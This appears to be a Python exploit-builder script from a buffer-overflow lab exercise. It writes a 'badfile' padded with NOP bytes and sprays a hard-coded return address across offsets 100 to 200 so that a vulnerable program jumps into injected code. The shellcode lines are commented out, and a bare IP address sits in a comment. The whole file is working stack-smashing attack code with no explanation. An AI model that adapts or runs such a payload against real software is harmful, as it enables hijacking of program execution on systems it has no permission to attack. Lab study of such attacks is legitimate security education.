import sys 
 

#172.203.112.83
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(765)) 
# Put the shellcode at the end 
# start = 765 - len(shellcode) 
# content[start:] = shellcode 
 
# Put the address at offset 112 
ret = 0x5655626d+ 250 
for i in range(100,200,4):
    content[i:i+4] = (ret).to_bytes(4,byteorder='little') 
 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 


